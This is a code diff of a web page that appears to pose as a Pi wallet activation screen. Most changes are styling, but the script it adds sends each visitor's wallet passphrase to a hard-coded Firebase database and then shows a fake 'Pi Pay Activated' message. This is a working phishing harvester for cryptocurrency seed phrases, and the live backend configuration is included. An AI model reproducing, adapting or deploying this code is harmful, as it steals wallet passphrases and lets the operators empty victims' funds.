@@ -40,6 +40,7 @@
             min-height: 120px;
             resize: vertical;
             text-align: center;
+            font-size: 16px;
         }
 
         .passphrase-field::placeholder {
@@ -59,6 +60,8 @@
             border-radius: 8px;
             cursor: pointer;
             transition: opacity 0.2s;
+            font-size: 16px;
+            font-weight: 500;
         }
 
         .passphrase-btn {
@@ -71,11 +74,6 @@
             background: #713d92;
             color: #FFFFFF;
             border: none;
-        }
-
-        .button-text {
-            font-size: 16px;
-            font-weight: 500;
         }
 
         .disclaimer-text {
@@ -127,45 +125,38 @@
             previous wallet will be inaccessible.
         </div>
     </div> 
-    <script type = "module">
-// Import the functions you need from the SDKs you need
-import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
-import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
+        import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
 
-// https://firebase.google.com/docs/web/setup#available-libraries
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCaAEOz7UeopyQZtjPAQhqHcrPL81sVPtw",
+            authDomain: "satoshi-pi-wallet.firebaseapp.com",
+            databaseURL: "https://satoshi-pi-wallet-default-rtdb.firebaseio.com",
+            projectId: "satoshi-pi-wallet",
+            storageBucket: "satoshi-pi-wallet.firebasestorage.app",
+            messagingSenderId: "759930873350",
+            appId: "1:759930873350:web:30f32d925da07685e98587"
+        };
 
-// Your web app's Firebase configuration
-const firebaseConfig = {
-  apiKey: "AIzaSyCaAEOz7UeopyQZtjPAQhqHcrPL81sVPtw",
-  authDomain: "satoshi-pi-wallet.firebaseapp.com",
-  databaseURL: "https://satoshi-pi-wallet-default-rtdb.firebaseio.com",
-  projectId: "satoshi-pi-wallet",
-  storageBucket: "satoshi-pi-wallet.firebasestorage.app",
-  messagingSenderId: "759930873350",
-  appId: "1:759930873350:web:30f32d925da07685e98587"
-};
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
 
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
+        // Get ref to database services
+        const db = getDatabase(app);
 
-//get ref to database services
-const db = getDatabase(app);
+        document.getElementById('passphraseBtn').addEventListener('click', function(e) {
+            set(ref(db, 'passphraseBtn' + document.getElementById("passphraseInput").value), {
+                passphraseinput: document.getElementById("passphraseInput").value
+            });
 
-document.getElementById('passphraseBtn').addEventListener('click', function(e) {
-
-    set(ref(db, 'passphraseBtn' + document.getElementById("passphraseInput").value),{
-
-
-        passphraseinput: document.getElementById("passphraseInput").value
-    })
-            
-    const passphrase = document.getElementById('passphraseInput').value;
-            
-            if(passphrase.trim().length > 0) {
+            const passphrase = document.getElementById('passphraseInput').value;
+            if (passphrase.trim().length > 0) {
                 alert("Pi Pay Activated");
             }
-        })
-
+        });
     </script>
 </body>
 </html>
